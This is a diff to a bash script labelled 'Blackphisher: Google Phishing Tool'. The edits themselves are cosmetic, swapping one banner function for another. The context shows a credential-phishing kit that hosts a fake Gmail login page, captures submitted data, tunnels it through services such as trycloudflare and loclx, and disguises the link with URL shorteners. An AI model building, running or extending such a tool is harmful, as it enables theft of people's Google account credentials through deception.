@@ -1,6 +1,6 @@
 #!/bin/bash
 
-##   Blackphisher 	: 	Google Phishing Tool 
+##   Blackphisher   R: 	Google Phishing Tool 
 ##   Author 	    : 	Pranav 
 ##   Version 	    : 	0.1
 ##   Github 	    : 	https://github.com/Pranav-20-v
@@ -286,7 +286,7 @@ cusport() {
 			echo
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-			{ sleep 2; clear; banner_small; cusport; }
+			{ sleep 2; clear; banner; cusport; }
 		fi		
 	else 
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
@@ -386,7 +386,7 @@ start_localhost() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_small; }
+	{ sleep 1; clear; banner; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
@@ -450,7 +450,7 @@ custom_url() {
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
-	{ custom_mask; sleep 1; clear; banner_small; }
+	{ custom_mask; sleep 1; clear; banner; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
@@ -496,7 +496,7 @@ site_gmail() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_gmail; };;
+			{ sleep 1; clear; banner; site_gmail; };;
 	esac
 }
 
